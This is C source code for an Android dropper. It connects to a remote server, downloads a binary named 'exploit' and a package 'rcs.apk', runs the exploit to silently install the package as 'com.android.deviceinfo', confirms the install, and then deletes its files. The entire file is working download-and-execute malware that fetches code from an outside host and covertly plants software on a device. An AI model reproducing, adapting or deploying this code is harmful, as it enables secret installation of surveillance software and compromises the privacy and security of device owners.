#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <dirent.h>

/* Uncomment the following line to enable logging, sha1 checking etc. */
/* #define DEBUG */

#define LOG_FILE "x.log"
#define LOG_MESSAGE_SIZE 256
#define TEMPBUF_SIZE 1024

#define COMMANDLINE_SIZE 256
#define MSG_SIZE 64

#define TMP_DIR "tmp"

#define PKG_NAME "com.android.deviceinfo"

#define MAX_FILES 20

#define MIN(a,b) ((a) < (b) ? (a) : (b))
#define MAX(a,b) ((a) > (b) ? (a) : (b))

static char server_ip[16];
static int  server_port = 0;
static char remove_files[MAX_FILES][MSG_SIZE];
static int remove_index = 0;

void remove_later(char *filename);

#ifdef DEBUG

void do_wlogf(const char *format, ...) {
  va_list args;
  int fd;
  char message[LOG_MESSAGE_SIZE];
  time_t now = time(NULL);
  char *timestr = asctime(localtime(&now));

  va_start(args, format);
  timestr[strlen(timestr)-1] = '\0'; /* get rid of trailing \n */

  fd = open(LOG_FILE, O_RDWR | O_CREAT | O_APPEND, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
  write(fd, timestr, strlen(timestr));
  write(fd, ": ", 2);
  vsnprintf(message, LOG_MESSAGE_SIZE, format, args);
  write(fd, message, strlen(message));
  write(fd, "\n", 1);
  close(fd);
}

void do_wlog(char *str) {
  int fd;
  time_t now = time(NULL);
  char *timestr = asctime(localtime(&now));
  char message[LOG_MESSAGE_SIZE];
  timestr[strlen(timestr)-1] = '\0'; /* get rid of trailing \n */

  fd = open(LOG_FILE, O_RDWR | O_CREAT | O_APPEND, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
  snprintf(message, LOG_MESSAGE_SIZE, "%s: %s\n", timestr, str);
  write(fd, message, strlen(message));
  close(fd);
}

#define wlog(str) do_wlog((str))
#define wlogf(...) do_wlogf(__VA_ARGS__)

/* requires /data/local/tmp/bin/busybox */
int debug_log_sha1(char *filename) {
  char cmd[COMMANDLINE_SIZE];
  char sha1[64];
  int fd;

  int exitstatus;
  snprintf(cmd, COMMANDLINE_SIZE, "/data/local/tmp/bin/busybox sha1sum %s > tmp_sha1", filename);
  exitstatus = system(cmd);
  exitstatus = WEXITSTATUS(exitstatus);

  if (exitstatus != 0) {
    wlogf("ERROR: command '%s' returned exit status %d", cmd, exitstatus);
    return -1;
  }

  remove_later("tmp_sha1");

  fd = open("tmp_sha1", O_RDONLY);
  if (fd < 0) {
    wlogf("ERROR: can't open file tmp_sha1: %s", strerror(errno));
    return -1;
  }

  if(read(fd, sha1, 40) == 0) {
    wlogf("ERROR: can't read file tmp_sha1");
    return -1;
  }

  sha1[40] = '\0';

  wlogf("%s: %s", filename, sha1);
  return 1;
}


#else

#define wlog(str)
#define wlogf(...)


#endif	/* DEBUG */

void cleanup() {
  int i;

/* #ifdef DEBUG */
/*   wlog("Skipping cleanup..."); */
/*   return; */
/* #endif   /\* DEBUG *\/ */

  wlog("----- cleanup -----");
  wlog("Removing files:");
  for (i = 0; i < remove_index; i++) {
    if (strlen(remove_files[i]) > 0) {
      if (remove(remove_files[i]) != -1) {
	wlogf("%s OK", remove_files[i]);
      } else {
	wlogf("%s ERR %s", remove_files[i], strerror(errno));
      }
    }
  }
  wlog("------------------");

}

int copy_file(char *src, char *dest) {
  int infd, outfd;
  ssize_t readlen;
  char buf[TEMPBUF_SIZE];
  infd = open(src, O_RDONLY);
  if (infd == -1) {
    wlogf("Can't open file %s for reading: %s", src, strerror(errno));
    return -1;
  }

  outfd = open(dest, O_WRONLY|O_CREAT|O_TRUNC, S_IRWXU|S_IRWXG|S_IRWXO);
  if (outfd == -1) {
    wlogf("ERROR: can't create file %s: %s", dest, strerror(errno));
    return -1;
  }

  while ((readlen = read(infd, buf, TEMPBUF_SIZE)) > 0) {
    if (write(outfd, buf, readlen) != readlen) {
      wlog("ERROR: An error occurred while writing to the output file");
      return -1;
    }
  }

  if (readlen == -1) {
    wlog("ERROR: can't read from input file");
  }

  if (close(infd) == -1) {
    wlog("ERROR: can't close input file");
  }

  if (close(outfd) == -1) {
    wlog("ERROR: can't close output file");
  }

  return 0;
}

/* Remove filename at cleanup */
void remove_later(char *filename) {
  if (remove_index < MAX_FILES) {
    strncpy(remove_files[remove_index++], filename, MSG_SIZE-1);
  } else {
    wlogf("File limit reached, %s won't be deleted.", filename);
  }
}


/* Download a file from the server */
int download_file(int sockfd, char *filename) {
  int fd;
  char msg[MSG_SIZE];
  uint32_t sizemsg;
  int size, readlen, written, total;

  total = 0;

  memset(msg, 0, sizeof(msg));
  snprintf(msg, sizeof(msg), "get!%s", filename);

  if( (fd = open(filename, O_WRONLY|O_CREAT|O_TRUNC, S_IRWXU | S_IRWXG | S_IRWXO)) == -1) {
    wlogf("ERROR: can't create file %s: %s", filename, strerror(errno));
    return -1;
  }

  if((send(sockfd, msg, strlen(msg), 0)) < 0) {
    close(fd);
    return -1;
  }

  memset(msg, 0, sizeof(msg));
  readlen = recv(sockfd, &sizemsg, sizeof(sizemsg), MSG_WAITALL);
  if(readlen < 0) {
    close(fd);
    return -1;
  }

  size = ntohl(sizemsg);

  wlogf("download_file: file size: %d, message read size: %d", size, readlen);

  memset(msg, 0, sizeof(msg));
  while( size > 0) {
    readlen = recv(sockfd, msg, MIN(size,sizeof(msg)), 0);
    if(readlen < 0) {
      wlogf("Error while receiving data: %s, remaining: %d", strerror(errno), size);
      close(fd);
      return -1;
    }
    written = write(fd, &msg, readlen);
    if (written < 0) {
      wlogf("ERROR: can't write to file: %s", strerror(errno));
      close(fd);
      return -1;
    }

    total += written;
    size -= readlen;

    memset(msg, 0, sizeof(msg));

  }

  if (size < 0) {
    wlogf("ERROR: remaining bytes: %d (should be 0). Download failed.", size);
    return -1;
  }

  remove_later(filename);
  wlogf("download_file: %d bytes written to %s", total, filename);

  if (close(fd) < 0) {
    wlogf("WARNING: could not close file descriptor: %s", strerror(errno));
  } else {
    wlogf("download_file: file closed");
  }

  return 1;
}

int check_package(char *name) {
  char cmd[COMMANDLINE_SIZE];
  char pk[256];
  int fd;

  /* Check if the package was installed correctly */
  memset(cmd, 0, sizeof(cmd));
  snprintf(cmd, sizeof(cmd), "pm list package -f %s > tmp_package_list", name);

  system(cmd);
  remove_later("tmp_package_list");

  fd = open("tmp_package_list", O_RDONLY);
  if (fd < 0) {
    wlogf("Can't get package list: %s", strerror(errno));
    return -1;
  }

  if(read(fd, pk, sizeof(pk)-1) == 0) {
    wlogf("Package %s not installed", name);
    return 0;
  }

  wlogf("Package %s installed correctly", name);
  return 1;
}

int download_retryonfail(int sockfd, char *filename, int maxtries) {
  int tries = 0;
  while (tries < maxtries) {
    wlogf("download %s: attempt %d/%d", filename, tries + 1, maxtries);
    if (download_file(sockfd, filename) < 0) {
      wlog("attempt failed.");
      tries++;
    } else {
      return 1;
    }
  }
  wlogf("ERROR: cannot download %s", filename);
  return -1;
}

int download_exec_exploit(int sockfd) {
  char cmd[COMMANDLINE_SIZE];
  char cwd[COMMANDLINE_SIZE];
  int exitstatus;

  if(download_retryonfail(sockfd, "exploit", 5) < 0) {
    wlog("Error downloading exploit");
    return -1;
  }

  #ifdef DEBUG
  debug_log_sha1("exploit");
  #endif

  if(download_retryonfail(sockfd, "rcs.apk", 5) < 0) {
    wlog("Error downloading rcs");
    return -1;
  }

  #ifdef DEBUG
  debug_log_sha1("rcs.apk");
  #endif

  if(getcwd(cwd, COMMANDLINE_SIZE) == NULL) {
    wlog("ERROR: can't get current working directory");
    return -1;
  }

  snprintf(cmd, COMMANDLINE_SIZE, "./exploit %s/rcs.apk", cwd);
  wlogf("system('%s')...", cmd);
  exitstatus = system(cmd);
  if (exitstatus == -1) {
    wlogf("ERROR: could not execute system: %s", strerror(errno));
  }
  exitstatus = WEXITSTATUS(exitstatus);
  wlogf("system() returned exit status %d", exitstatus);

  if (exitstatus != 0) {
    wlog("WARNING: system() did not complete successfully.");
    return 1;
  }


  wlog("waiting for package to install ...");
  sleep(8);
  if (check_package(PKG_NAME) == 1) {
    wlog("Ok, package installed");
    return 1;
  }
  wlog("Package not installed.");

  return -1;
}


void am_start(unsigned int ip, unsigned short port)
{
  unsigned char bytes[4];
  int sockfd;
  struct sockaddr_in server_addr;
  struct in_addr addr;
  struct timeval tv;
    
  wlog("Starting...");

  /* Generating ip address string */
  bytes[0] = ip & 0xFF;
  bytes[1] = (ip >> 8) & 0xFF;
  bytes[2] = (ip >> 16) & 0xFF;
  bytes[3] = (ip >> 24) & 0xFF;
  sprintf(server_ip, "%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3] );
  wlogf("Server IP: %s", server_ip);
  server_port = port;
  
  /* Create a socket with server */
  if (inet_pton(AF_INET, server_ip, &addr) != 1) {
    wlogf("ERROR: inet_pton failed");
    return;
  }

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(server_port);
  server_addr.sin_addr = addr;

  
  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    wlog("Unable to create socket");
    return;
  }

  /* Set socket timeout */
  tv.tv_sec = 30;  /* 30 Secs Timeout */
  tv.tv_usec = 0;

  if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *)&tv, sizeof(struct timeval)) < 0) {
    wlogf("WARNING: can't set socket timeout");
  }
  
  if(connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr))) {
    wlog("Unable to connect");
    return;
  }

  wlog("Connected!");

  if (download_exec_exploit(sockfd) < 0) {
    wlog("FAIL :( could not install package");
  } else {
    wlog("DONE :) package downloaded and installed successfully");
  }

  wlog("Cleaning up. Goodbye!");
  cleanup();
  close(sockfd);
}